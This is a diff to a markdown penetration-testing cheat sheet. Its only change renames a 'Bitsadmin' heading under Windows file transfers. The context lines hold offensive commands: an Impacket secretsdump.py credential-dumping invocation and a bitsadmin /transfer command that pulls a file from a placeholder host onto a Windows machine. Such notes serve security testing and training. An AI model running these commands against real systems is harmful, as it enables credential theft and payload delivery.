@@ -367,7 +367,7 @@ secretsdump.py <domain>/<user>:<password>@<IP>
 ### Windows File Transfers
 #### LOLBAS
   
-##### Bitsadmin
+##### Bitsadmin from Powershell
 ```powershell
 bitsadmin /transfer wcb /priority foreground http://<host>/<file> C:\Users\<User>\Desktop\<file>
 ```
